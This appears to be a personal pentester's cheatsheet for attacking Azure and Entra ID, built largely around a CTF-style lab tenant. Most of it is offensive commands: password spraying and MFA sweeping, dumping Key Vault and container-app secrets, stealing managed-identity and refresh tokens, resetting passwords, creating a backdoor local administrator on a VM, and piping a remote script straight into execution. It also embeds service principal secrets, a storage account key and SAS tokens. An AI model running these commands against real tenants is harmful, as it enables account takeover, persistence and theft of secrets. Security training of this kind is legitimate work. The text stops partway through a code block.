# Cheatsheets, scripts and tools

[Remember this ](https://www.notion.so/Remember-this-2026d6c22ed980ef8c7bf19be7e07e5f?pvs=21)

# Generate device code flow login

```powershell
curl -X POST https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/devicecode \
  -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=openid profile email offline_access"
```

NOTE: client id above is for microsoft office

*d3590ed6-52b3-4102-aeff-aad2292ab01*

# Azure known domains

| Service | Endpoint |
| --- | --- |
| Blob Storage |  https://<storage-account>.blob.core.windows.net
 |
| Static Website (Blob Storage) |  https://<storage-account>.web.core.windows.net
 |
| Data Lake Storage |  https://<storage-account>.dfs.core.windows.net |
| Azure Files |  https://<storage-account>.file.core.windows.net |
| Queue Storage |  https://<storage-account>.queue.core.windows.net |
| Table Storage | https://<storage-account>.table.core.windows.net |
| Azure Websites | https://<app-name>.azurewebsites.net |
| Azure Cosmos DB | https://<account-name>.cosmos.azure.com |
| Azure Cosmos DB | https://<account-name>.document.azure.com |
| Azure Key Vault |  https://<key-vault-name>.vault.azure.net |

# Basic Enumeration

## Simple recon - check if the company uses Entra ID

```powershell
https://login.microsoftonline.com/getuserrealm.srf?login=<company_name.tld>&xml=1
```

## Get the tenant ID

```powershell
https://login.microsoftonline.com/<company_name.tld>/.well-known/openid-configuration
```

# OSINT with AADInternals

```powershell
[https://aadinternals.com/osint/](https://aadinternals.com/osint/)
```

## Check the region with the ip of the hosted domain

```powershell
curl --silent 'https://azservicetags.azurewebsites.net/api/iplookup?ipAddresses=20.75.112.13' | jq
```

# List Azure blob containers

```powershell
# explore the identified storage container
https://<container_name>.blob.core.windows.net/$<name_here>?restype=container&comp=list

# add the versions for the items listed
https://<container_name>.blob.core.windows.net/$web?restype=container&comp=list&include=versions

# list storage accounts
az storage account list --query "[].name" -o tsv

# list tables from a storage account
az storage table list --account-name <storage_acc_name> --output table --auth-mode login

# list the contents for the table
az storage entity query --table-name <table_name> --account-name <storage_acc_name> --output table --auth-mode login

# list containers content with a SAS token string
az storage container list --account-name <name> --sas-token "sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=Dws3bgGUWCUknRdVmRoFXItmnItJDLHy76Axgu1qNtE%3D"

# get the content of the discovered container
az storage blob list --account-name <name> --container-name <cnt_name> --sas-token "sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=Dws3bgGUWCUknRdVmRoFXItmnItJDLHy76Axgu1qNtE%3D" --output table

# get a specific blob/file from the container
az storage blob download --account-name <acct_name> --container-name <cnt_name> --name "filename.ext" --file "filename.ext" --sas-token 'sv=2022-11-02&ss=bfqt&srt=sco&sp=rl&se=2099-05-06T06:03:29Z&st=2024-05-05T22:03:29Z&spr=https&sig=Dws3bgGUWCUknRdVmRoFXItmnItJDLHy76Axgu1qNtE%3D' --output table
```

# check if VM is domain joined

```powershell
dsregcmd /status
```

# AZ Cli

https://learn.microsoft.com/en-us/cli/azure/reference-index?view=azure-cli-latest

### logging in & whoami

```powershell
# setup user and login
az login

#adding the scope for the login
az login --scope https://management.core.windows.net//.default
az login --scope https://management.azure.com//.default
az login --scope https://graph.microsoft.com//.default

# check the current user that is signed in
az ad signed-in-user show

# show the user
az ad user show --id <mail@address.tld>

# check the account
az account show

# get the entire list of users
az ad user list --query "[].UserPrincipalName" --output tsv > upnlist.txt

# get the access token
az account get-access-token --resource https://management.azure.com/

# list subscriptions
az account subscription list

# list resources, adding identities 
az resource list --query "[].{Type:type, Name:name, ResourceGroup: ResourceGroup, Identity:Identity}"

```

### Service Principals

```powershell
# dump all spns with the right permissions like User.Read.All from the MsGraph API
az ad sp list --all --query '[].{Name:displayName, AppId:appId, ObjectId:objectId}' --output table

# Show the info with the sp ID
az ad sp show --id 5373069e-abcb-41e5-b933-8a81ada5ae37

# check basic info with logged in spn, get the name from the output and use it below to login if you have the secret. The id from the output is the tenantId 
az account show

# log in as a service principal, appplication and client id are the same, here the -u represents the app id
az login --service-principal -u "5373069e-abcb-41e5-b933-8a81ada5ae37" -p "sZt8Q~NgRdFi1JlZ0C5jOxjENV1JuRO~2vpurc84" --tenant "7ee2f8e8-185b-45be-8fcf-c2a493cade1b" --allow-no-subscription

# reset the password for a service principal
az ad sp credential reset --id <$app_id> --end-date <$endDate> --query password --output tsv
```

### List resources

```powershell
az resource list | fl

# check the IP resources for the logged in user
az resource list --query "[].{Type:type, Name:name, Id:id}“ | grep -i ipAddress
 
az resource show --id "/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/DCNY02_group/providers/Microsoft.Network/publicIPAddresses/DCNY02-ip" --query "[properties.ipAddress]"

az resource list --query "[].{Type:type, Name:name}"
az resource list --query "[].{Name:Name, Type:Type, ResourceGroup:ResourceGroup}"

# adding identity for the resource
az resource list --query "[].{Type:type, Name:name, ResourceGroup: ResourceGroup, id:id}"
 

```

### Storage accounts, containers, blobs

```powershell
# list storage accounts
az storage account list --query '[].{Type:type, Name:name}'

# get the content of a storage acc
az storage container list --account-name <account_name> --auth-mode login --query '[].name' 

# get the blob from the container
az storage blob list --account-name <account_name> --container-name <container_name> --auth-mode login --output table

# get the file
az storage blob download --account-name configbackupfiles --container-name peterfiles --name "credentials.txt" --file "credentials.txt" --auth-mode login

```

### fileshares

```powershell
# get keys for a fileshare
az storage account keys list --account-name cslaura --resource-group mbt-rg-11 -o table

# list files with the given key
az storage file list --account-name cslaura --share-name cslaura --account-key u6GFHrmqyvJnNwfHhLJH/nPH70DVAmpUzkiCZWOq+aznntBLkYoTzX/gxnvvnGhBHg6s3G2S3g9p+AStFU1vOg== -o table

# download a file
az storage file download \
  --account-name <name> \
  --share-name <share> \
  --path file_path/file.ext \
  --dest ./loot/file.ext \
  --account-key <key>
```

### container apps

```powershell
az containerapp list --query "[].{Name:name, Type:type, ResourceGroup:ResourceGroup, environmentId: properties.environmentId, id:id}"

az containerapp show --name <name> --resource-group <rg_name>

# show secrets
az containerapp show --name <name> --resource-group <rg_name> --show-secrets --query "properties.configuration.secrets"

# Get the content for the secret
az containerapp secret list -n <name> -g <rg_name> --show-values

# show container app environment variables
az containerapp show --name <name> --resource-group mbt-rg-17 --query "properties.template.containers[0].env"

# connect remotely to a container app
az containerapp exec --name <name> --resource-group <rg_name>

# remember if on a container you can check for tokens too
env | grep IDENTITY
IDENTITY_HEADER=5b7f86bf-fcdb-43b6-b69c-f13fe106a481
IDENTITY_ENDPOINT=http://localhost:42356/msi/token
resource=https://management.azure.com

# we can use curl to get the auth token
curl -X POST -H "Authorization: Bearer $tok" "https://management.azure.com/subscriptions/<$sub_id>/resourceGroups/<$rg_group_name>/providers/Microsoft.App/containerApps/<$container_app_name>/getAuthtoken?api-version=2024-03-01" -H "Content-Type: application/json" -d {}

# this allows us to list secrets
curl -X POST -H "Authorization: Bearer $tok" "https://management.azure.com/subscriptions/<$sub_id>/resourceGroups/<$rg_group_name>/providers/Microsoft.App/containerApps/<$container_app_name>/listSecrets?api-version=2024-03-01" -H "Content-Type: application/json" -d {} | jq

# using the token itself from az account get-access-token
curl -s X POST "https://management.azure.com/subscriptions/<$sub_id>/resourceGroups/<$rg_group_name>/providers/Microsoft.App/containerApps/<$container_app_name>/listSecrets?api-version=2024-03-01" -H "Authorization: Bearer $armaccesstoken" -d {} | jq
```

### KeyVault

```powershell
# list the keyvaults
az keyvault list --query '[].name'

# show contents from the vault
az keyvault show --name <vault_name>

az keyvault show --name <vault_name> --resource-group <rg_group>

# list the secrets from the vault
az keyvault secret list --vault-name <vault_name> --query '[].name'

# show the secret
az keyvault secret show --vault-name "<keyvault-name>" --name "secret"

# list the content of the vault
az keyvault secret list --vault-name Engineering-Vault1

```

### Get all the users in entra ID

```powershell
# get the entire list of users
az ad user list --query "[].userPrincipalName" --output tsv > upnlist.txt
```

### az web app

```powershell
az webapp deployment list-publishing-credentials --name megabigtech-staging --resource-group mbt-rg-11

az webapp config appsettings list --name megabigtech-staging --resource-group mbt-rg-11
```

### az vm run commands

```powershell

# list vm
az vm list

# list ips for a vm
az vm list-ip-addresses --resource-group <rg_name>

# in this case the user is able to run commands on the domain controller
az vm run-command invoke --resource-group 'DCNY02' --name 'name' --command-id RunPowerShellScript --scripts 'whoami'

# add a new user
az vm run-comman invoke --resource-group 'DCNY02' --name 'name' --command-id RunPowerShellScript --scripts "NewLocalUser -Name 'hacker' -Password (ConvertTo-SecureString 'AzHacker123!' -AsPlainText -Force) -AccountNeverExpires"

# next step add the new user to local admin
az vm run-comman invoke --resource-group 'DCNY02' --name 'name' --command-id RunPowerShellScript --scripts "cmd /c net localgroup 'Administrators' hacker /add"

# show user data from the vm
az vm show --resource-group "mbt-rg-22" --name "SECURITY-DIRECTOR" -u --query "userData" --output tsv | base64 -d

# powershell - From a Unix pwsh session with base64 installed
(Get-AzVM -ResourceGroupName "mbt-rg-22" -Name "SECURITY-DIRECTOR" -UserData).UserData | base64 -d

# get public ip address for a vm
az network public-ip show --resource-group mbt-rg-22 --name SECURITYDIRECTORip304 --query "ipAddress" --output tsv

# another command for listing ip addresses, takes out only the ip
az vm show -d -g mbt-rg-5 -n AUTOMAT01 --query publicIps -o tsv

# get the ip address for a vm
az vm list-ip-addresses --resource-group MBT-RG-5

```

### get tokens

```powershell
# get tokens
az account get-access-token

# get token for a specific resource
az account get-access-token --resource "https://vault.azure.net" --query "AccessToken" --output tsv

az account get-access-token --resource "https://graph.microsoft.com" --query "AccessToken"  --output tsv

az account get-access-token --resource "https://management.azure.net" --query "AccessToken" --output tsv

```

## roles

```powershell
# list all possible roles for the user
az role assignment list --assignee <user@mail.com> --all --output table

# check roles assigned for a known user with the discovered id for the scope
az role assignment list --assignee <username> --scope /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-17/providers/Microsoft.App/containerApps/payment-prod-us-east --query '[].roleDefinitionName'

# get thed definition for the role
az role definition list --name 'Reader'

# get the roles for the user only
az role definition list --custom-role-only true --query "[].roleName"

# list who can assume roles ish
az role eligibility list --scope "/subscriptions/<subscription_id>"

# eligible role assignments
az role assignment list --scope "/subscriptions/<subscription_id>"
#save the id to a local var and pass it like that

# check role assignment over id of resource (system managed identity)
az role assignment list --assignee rohit.kumar@megabigtech.com --scope $id --query '[].roleDefinitionName'

# check the defintion for the role
az role definition list --name 'Role Name'

```

## groups

```powershell
az ad user get-member-groups --id "name@domain.tld" --security-enabled-only

```

## dynamic groups check

```powershell
az ad group list --query "[?membershipRule != null]" --output json

az ad group list --query "[?membershipRule != null].{Name:displayName, Rule:membershipRule, RuleProcessingState:membershipRuleProcessingState}" --output table

az ad group list --query "[?membershipRule != null]" | jq '.[] | {displayName, membershipRule, membershipRuleProcessingState}'
```

## conditional access

```powershell

# list conditional access
az ad conditional-access policy list
```

## containerapp

```powershell
az containerapp show --name <name> --resource-group <resource-group>

# list the secrets and their content
az containerapp show --name <name> --resource-group <resource-group> --show-secrets --query "properties.configuration.secrets"

# List the content for the secret
az containerapp secret list -n <name> -g <rg_name> --show-values

# fetch the secret from controlplane, this command fetches the azure resource management token
armaccesstoken=$(az account get-access-token --query "AccesToken" -o tsv)

# if the role has exec assigned we can connect to the container
az containerapp exec --name <name> --resource-group <resource_group>

# we can extract access tokens from the container
env | grep IDENTITY
IDENTITY_HEADER=5b7f86bf-fcdb-43b6-b69c-f13fe106a481
IDENTITY_ENDPOINT=http://localhost:42356/msi/token
resource=https://management.azure.com

# get the curl command
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01"

# example with az get method to list secrets
az rest \
  --method post \
  --url "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-17/providers/Microsoft.App/containerApps/payment-prod-us-east/listSecrets?api-version=2024-03-01"

# we can also obtain the token directly from the az rest command, but this is limited for the container only
az account get-access-token \
az rest --method post --url "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-17/providers/Microsoft.App/containerApps/payment-prod-us-east/getAuthToken?api-version=2024-03-01"

```

## instance metadata - get the access token

```powershell
# first check the env or sometimes can be found  
~/.azure/msal_token_cache.json

# if not we can build our own curl command to get the token, using the env command
env | grep IDENTITY
IDENTITY_HEADER=5b7f86bf-fcdb-43b6-b69c-f13fe106a481
IDENTITY_ENDPOINT=http://localhost:42356/msi/token
resource=https://management.azure.com

# set the variables and we are good to go!
curl -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01"

# check if the env is an azure vm
Invoke-RestMethod -Headers @{"Metadata"="true"} -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | fl *

```

## kudu connect

```powershell
# connect to the kudu interface
az webapp create-remote-connection --subscription <sub_id> --resource-group <rg_group> -n <site_name>

# now use ssh to connect
ssh root@127.0.0.1 -m hmac-sha1 -p <port_from_above_output>
```

## rest commands

```powershell
# get the value from a secret, listSecrets
az rest \
  --method post \
  --url "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-17/providers/Microsoft.App/containerApps/payment-prod-us-east/listSecrets?api-version=2024-03-01"
  
# get the auth token for a container, getAuthToken
az rest \
  --method post \
  --url "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-17/providers/Microsoft.App/containerApps/payment-prod-us-east/getAuthToken?api-version=2024-03-01"
  
  # get the subscription from the management.azure api
az rest --method get --uri "https://management.azure.com/subscriptions?api-version=2020-01-01"

```

### rest command to list conditional access

```powershell
 # alternative method to check for conditional access if the spn has the right permissions fro conditionala access read.all
az rest --method get --uri "https://graph.microsoft.com/v1.0/policies/conditionalAccessPolicies"
```

# Az Powershell and Microsoft Graph PowerShell SDK

```python
# installation
Install-Module -Name Az -Repository PSGallery -Force
Import-Module -Name Az

Install-Module -Name Microsoft.Graph -Scope CurrentUser -AllowClobber -Force
Import-Module -Name Microsoft.Graph

# this is the beta powershell version, do not use - just for reference
Install-Module Microsoft.Graph.Beta -Repository PSGallery -Force

# authenticate with the account username and password
Connect-AzAccount

# include the scope for the authentication
Connect-AzAccount -AuthScope https://management.azure.com
Connect-AzAccount -AuthScope https://graph.microsoft.com

# using an access token from additional resource and authenitcating with the pwsh SDK
Connect-AzAccount -AccessToken $token -AccountId "whateverstring"

# same for graph
Connect-MgGraph

# list all properties for a user
Get-MgUser -UserId "upn_username.com" | fl

# check the user
Get-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl

# check for users that have the word admin in their name or any other string
Get-AzADUser | Where-Object { $_.DisplayName -match "adm" }

# check for administrative units
Get-MgDirectoryAdministrativeUnit | fl

# same for graph
Get-MgUserOwnedObject -UserId "[yuki.tanaka@megabigtech.com](mailto:yuki.tanaka@megabigtech.com)"

# check resources for the user
Get-AzResource

# get the role assignment
Get-AzRoleAssignment -SignInName [yuki.tanaka@megabigtech.com](mailto:yuki.tanaka@megabigtech.com)

# get the content for the automations variable
Get-AzAutomationVariable -ResourceGroupName 'mbt-rg-25' -AutomationAccountName 'AudoTaskRunner'

Get-MgUser -Filter 'onPremisesSyncEnabled eq True' | Select-Object UserPrincipalName | Out-File onprem_sync_users.txt 

# get the token for the user
Get-AzAccessToken

# token for azure with powershell
(Get-AzAccessToken -ResourceUrl "https://vault.azure.net/").Token

# token for graph with powershell
(Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com/").Token

# azure token
(Get-AzAccessToken -ResourceUrl "https://management.azure.com/").Token

# Connect to Azure
Connect-AzAccount

# List Active Role Assignments
Get-AzRoleAssignment -Scope "/subscriptions/<subscription_id>"

# PIM-Specific via Microsoft Graph (needs Graph SDK)
Get-MgPrivilegedRoleAssignmentRequest

# get the runbook content, usually a script
Export-AzAutomationRunbook -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" -Name Schedule-VMStartStop -Output .

# get the credentials configured for the automation account
Get-AzAutomationCredential -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | Format-Table Name, CreationTime, Description

# how you can easily query and find all privileged admins in Entra
Invoke-MgGraphRequest -Uri "/beta/roleManagement/directory/roleAssignments?`$expand=roleDefinition&`$filter=roleDefinition/isPrivileged eq true"

# get az vm user data base64 encoded
Get-AzVM -ResourceGroupName "rg-group" -name "name" -UserData

# memberof 
Get-MgUserMemberOf -UserId dbuser@megabigtech.com | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}

# check members of an administrative unit
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <unit_id> | Select-Object roleMemberInfo,roleId -ExpandProperty roleMemberInfo

# check for entra id users that have been assigned a role
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId 47e4803e-a5ef-4ebc-b967-691815870abd | Select-Object roleMemberInfo,RoleId -ExpandProperty roleMemberInfo | fl

# describe the role with a given ID
Get-MgDirectoryRole -DirectoryRoleId ccb673b7-ab87-4fc0-87c5-39751a049539 | fl

# check for members of the administrative unit with the assigned ID
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId 47e4803e-a5ef-4ebc-b967-691815870abd | Select * -ExpandProperty additionalProperties

# good command for situational awareness 
Get-MgUserOwnedObject -UserId [Daiki.Hiroko@megabigtech.com](mailto:Daiki.Hiroko@megabigtech.com) | Select * -ExpandProperty additionalProperties

# exploring storage accounts and containers
# set the context first
New-AzStorageContext -StorageAccountName <storage_acc_name>

# get the blobs or objects withing that container name, simplified and one command
# example description is Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read - data plane action for both blobs and containers
Get-AzStorageBlob -Container general-purpose -Context (New-AzStorageContext -StorageAccountName storageqaenv)

# check the app hostnames
(Get-AzWebApp -ResourceGroupName "megabigtech-dev_group" -Name "megabigtech-dev").EnabledHostNames

# get the administrative unit users and sort them
Get-MgDirectoryAdministrativeUnit | Select-Object DisplayName, Id

# get the subscriptions for the logged in user,  tenant id is optional
Get-AzSubscription -TenantId <tenant_id>
```

### reset user password with MgUser cmdlet

```powershell
$params = @{
    passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = "NewSecurePassword123!"
    }
}

Update-MgUser -UserId Felix.Schneider@megabigtech.com -BodyParameter $params
```

### check for users AD sync

```powershell
Get-MgUser -UserId "upn" | Select-Object DisplayName, UserPrincipalName, OnPremisesSyncEnabled 
```

### list resources

```powershell
# check resources for the user
Get-AzResource
```

### check roles with role assignment

```powershell
# get the role assignment
Get-AzRoleAssignment -SignInName [yuki.tanaka@megabigtech.com](mailto:yuki.tanaka@megabigtech.com)

# describe the role with a given ID
Get-MgDirectoryRole -DirectoryRoleId ccb673b7-ab87-4fc0-87c5-39751a049539 | fl
```

### find privileged admins

```powershell
# how you can easily query and find all privileged admins in Entra
Invoke-MgGraphRequest -Uri "/beta/roleManagement/directory/roleAssignments?`$expand=roleDefinition&`$filter=roleDefinition/isPrivileged eq true"
```

### automation variable, runbook, credential

```powershell
# get the content for the automations variable
Get-AzAutomationVariable -ResourceGroupName 'mbt-rg-25' -AutomationAccountName 'AudoTaskRunner'

# get the runbook content, usually a script
Export-AzAutomationRunbook -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" -Name Schedule-VMStartStop -Output .

# get the credentials configured for the automation account
Get-AzAutomationCredential -ResourceGroupName "mbt-rg-5" -AutomationAccountName "automation-dev" | Format-Table Name, CreationTime, Description
```

### storage accounts and containers

```powershell
# exploring storage accounts and containers
# set the context first
New-AzStorageContext -StorageAccountName <storage_acc_name>

# get the blobs or objects withing that container name, simplified and one command
# example description is Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read - data plane action for both blobs and containers
Get-AzStorageBlob -Container general-purpose -Context (New-AzStorageContext -StorageAccountName storageqaenv)
```

### administrative units

```powershell
# get the administrative unit users and sort them
Get-MgDirectoryAdministrativeUnit | Select-Object DisplayName, Id

Get-MgDirectoryAdministrativeUnit | Select-Object DisplayName, Description, Id | fl

Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <unit_id> | fl

# check members of an administrative unit
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <unit_id> | Select-Object roleMemberInfo,roleId -ExpandProperty roleMemberInfo

# get roles
Get-MgDirectoryRole | Where-Object {$_.Id -eq $(Get-MgDirectoryAdministrativeUnitScopedRoleMember AdministrativeUnitId "<$au_id>" | Select-Object RoleId).RoleId} | fl

# determine on which user or on which identity you can use the permissions
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId <unit_id> | Select * -ExpandProperty additionalProperties
```

### check subscriptions

```powershell
# get the subscriptions for the logged in user,  tenant id is optional
Get-AzSubscription -TenantId <tenant_id>
```

### mysqlFlexibleServer

```powershell
Get-AzMySqlFlexibleServer -ResourceGroupName "mbt-rg-17" -Name "mbt-payments-db-1" | fl

# mysql command
mysql -h mbt-payments-db-1.mysql.database.azure.com -u paymentuser -D payments -p
```

# EntraID powershell SDK

```powershell
Import-Module Microsoft.Entra
Connect-Entra
```

### Check sign-in logs for the application

```powershell
$appDisplayName = '<display name>' # example MicrosoftGraph
Get-EntraServicePrincipal -SearchString $appDisplayName | Select-Object Id, DisplayName, SignInAudience, AppOwnerOrganizationId
```

# using a script - no idea what this is

```powershell
Register-ArgumentCompleter -Native -CommandName az -ScriptBlock {
    param($commandName, $wordToComplete, $cursorPosition)
    $completion_file = New-TemporaryFile
    $env:ARGCOMPLETE_USE_TEMPFILES = 1
    $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file
    $env:COMP_LINE = $wordToComplete
    $env:COMP_POINT = $cursorPosition
    $env:_ARGCOMPLETE = 1
    $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0
    $env:_ARGCOMPLETE_IFS = "`n"
    $env:_ARGCOMPLETE_SHELL = 'powershell'
    az 2>&1 | Out-Null
    Get-Content $completion_file | Sort-Object | ForEach-Object {
        [System.Management.Automation.CompletionResult]::new($_, $_, "ParameterValue", $_)
    }
    Remove-Item $completion_file, Env:\_ARGCOMPLETE_STDOUT_FILENAME, Env:\ARGCOMPLETE_USE_TEMPFILES, Env:\COMP_LINE, Env:\COMP_POINT, Env:\_ARGCOMPLETE, Env:\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\_ARGCOMPLETE_IFS, Env:\_ARGCOMPLETE_SHELL
}
```

# Powershell commands for AzAD

```powershell
#check user signed in
Get-AzADUser -SignedIn | fl

Get-AzADUser | Select-Object DisplayName, UserPrincipalName

Get-AzADUser | Where-Object { $_.DisplayName -match "admin" }

```

# Commands - WIP

```bash
# get all the user agents from the github repo
curl --silent https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1 | grep '$UserAgent ' | awk -F'"' '{print "\""$2"\","}'
```

# Tools - WIP

## Enumeration

### Generate username emails for pass spraying

https://github.com/hac01/uwg/

```python
# saves the output to wordlist.txt
main.py -name 'John Doe' -d 'microsoft.com' 

```

### basicblobfinder

```powershell
# run this as an example before and save to a file, after running the azsunenum.py
for word in $(cat permutations.txt); do echo storage_container:$word; done > ~/azure_m365_bootcamp/ctf/storage.txt

# after running the azenum 
python3 basicblobfinder.py ~/azure_m365_bootcamp/ctf/storage.txt
```

### o365enum.py

```powershell
# with a list of usernames upn created run the tool to check the office.com account validity
/opt/azure_tools/o365enum/o365enum.py -u wordlist.txt -n 1 -m office.com
```

### o365userfinder

[oh365userfinder](https://github.com/dievus/oh365userfinder)

```powershell
# validates if the email format is correct
oh365userfinder.py -e s.olsson@megabigtech.com

# read a file and validate against a domain?
oh365userfinder.py -r users.txt

# pass spray
python3 oh365userfinder.py -p 'Velkommen1' --pwspray --elist email.txt

```

### Bridge keeper - **Scrape** employee names from search engine LinkedIn profiles

https://github.com/0xZDH/BridgeKeeper

example usage:

```python
bridgekeeper.py --company "Example, Ltd." --domain example.com --api {API_KEY} --depth 10 --output example-employees
```

### AADInternals

```python
# get the domain info
Get-AADIntLoginInformation -Domain domain.tld

# get more information, recon
Invoke-AADIntReconAsOutsider -DomainName megabigtech.com

# get the tokens
Export-AzureCliTokens | fl
```

### AzSubEnum

```python
# get the subdomains for a domain
python3 azsubenum.py -b <domain_name> --thread 10 -p permutations.txt

# loop the found permutations with the created list
for word in $(cat /opt/azure_tools/AzSubEnum/permutations.txt); do echo megabigtechinternal:$word

```

### MSOLSpray

```python
# git clone
git clone https://github.com/dafthack/MSOLSpray.git

#import module
Import-Module .\MSOLSpray.ps1

# run the tool with one user identified to validate the password as example below
Invoke-MSOLSpray -UserList user.txt -Password 'MegaDev79$' -verbose 

```

### MFASweep

```powershell
# quick install
#option1
iwr https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1 | iex

# get the ps1 file and import module
wget https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1 -O MFASweep.ps1
Import-Module .\MFASweep.ps1

# use with a username and password
Invoke-MFASweep -Username sam.olsson@megabigtech.com -Password theD@RKni9ht -Recon
```

### bloodhound

```powershell
# shut down the docker compose
docker-compose -f bloodhound.yml down -v

# list the docker 
docker ps -a

# get the logs from the hash for the docker
docker logs <string_value>

# rebuild the docker-compose
docker-compose -f bloodhound.yml up -d

# get the newly set password
docker logs <strings> | grep 'Initial'

# login with browser
http://localhost:8080/ui/login

# get the global admin from the cypher query language
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

```

### AzureHound

```powershell
azurehound -u "username" -p "password" list --tenant "2590ccef-*****-***-****" -o output.json

# using access tokens
azurehound -j <azureRM_access_token> list --tenant '<tenant_id>' -o azure_output.json 
azurehound -j <MSGraph_Access_token> list --tenant '<tenant_id>' -o entra_output.json

# using azurehound with refresh tokens
azurehound --refresh-token 'ey...' list --tenant <tenant_id>
```

### idPowerApp - Merril

Paste the output of the below command into the policy generator

https://idpowertoys.merill.net/ca

```powershell
# remember first to authenticate with an spn - example below from my own lab
az login --service-principal -u "5373069e-abcb-41e5-b933-8a81ada5ae37" -p "sZt8Q~NgRdFi1JlZ0C5jOxjENV1JuRO~2vpurc84" --tenant "7ee2f8e8-185b-45be-8fcf-c2a493cade1b" --allow-no-subscription

# you can also get the access token for the spn once logged in
az account get-access-token --resource https://graph.microsoft.com/

az rest --method get --uri "https://graph.microsoft.com/v1.0/policies/conditionalAccessPolicies"

# we can also curl natively with the access token in the request
curl -X GET "https://graph.microsoft.com/v1.0/policies/conditionalAccessPolicies" -H "Authorization: Bearer $access_token" -H "Content-Type: application/json" | jq
```

example output from the command

```powershell
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#policies/conditionalAccessPolicies",
  "value": [
    {
      "conditions": {
        "applications": {
          "applicationFilter": null,
          "excludeApplications": [],
          "includeApplications": [
            "All"
          ],
          "includeAuthenticationContextClassReferences": [],
          "includeUserActions": []
        },
        "authenticationFlows": {
          "transferMethods": "deviceCodeFlow"
        },
        "clientAppTypes": [
          "all"
        ],
        "clientApplications": null,
        "devices": null,
        "insiderRiskLevels": null,
        "locations": null,
        "platforms": {
          "excludePlatforms": [
            "android",
            "windowsPhone"
          ],
          "includePlatforms": [
            "all"
          ]
        },
        "servicePrincipalRiskLevels": [],
        "signInRiskLevels": [],
        "userRiskLevels": [],
        "users": {
          "excludeGroups": [],
          "excludeGuestsOrExternalUsers": null,
          "excludeRoles": [],
          "excludeUsers": [
            "6ebe9aa4-8666-42a5-813b-bf5ef553a5a7"
          ],
          "includeGroups": [],
          "includeGuestsOrExternalUsers": null,
          "includeRoles": [],
          "includeUsers": [
            "All"
          ]
        }
      },
      "createdDateTime": "2025-05-30T19:45:30.4862179Z",
      "displayName": "NoCodeFlow",
      "grantControls": {
        "authenticationStrength": null,
        "authenticationStrength@odata.context": "https://graph.microsoft.com/v1.0/$metadata#policies/conditionalAccessPolicies('b373b922-3bf9-4d48-a6df-f8ec5a03bd70')/grantControls/authenticationStrength/$entity",
        "builtInControls": [
          "block"
        ],
        "customAuthenticationFactors": [],
        "operator": "OR",
        "termsOfUse": []
      },
      "id": "b373b922-3bf9-4d48-a6df-f8ec5a03bd70",
      "modifiedDateTime": "2025-06-07T07:31:16.8430613Z",
      "sessionControls": {
        "applicationEnforcedRestrictions": null,
        "cloudAppSecurity": null,
        "disableResilienceDefaults": null,
        "persistentBrowser": null,
        "signInFrequency": {
          "authenticationType": "primaryAndSecondaryAuthentication",
          "frequencyInterval": "timeBased",
          "isEnabled": true,
          "type": "days",
          "value": 1
        }
      },
      "state": "enabled",
      "templateId": null
    }
  ]
}
```

## Lateral Movement

### TokenTactics

https://github.com/f-bader/TokenTacticsV2

```powershell
# example usage
Import-Module .\TokenTactics.psd1
Get-Help Get-AzureToken
Invoke-RefreshToSubstrateToken -Domain "myclient.org"

# get a refresh token
Get-AzureToken -Client MSGraph

# exchange the refresh token for a new access token
RefreshTo-MSGraphToken -Domain megabigtech.com -RefreshToken 

Invoke-RefreshToMSGraphToken -domain megabigtech.com -refreshToken $token

# get teams access with a refresh token
RefreshTo-MSTeamsToken -domain megabigtech.com -RefreshToken $token

# read the teams messages
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | 
fl id,content,deletiontime,*type*,DisplayName
```

### Find me access

https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications

```powershell
# check with the audit flag first
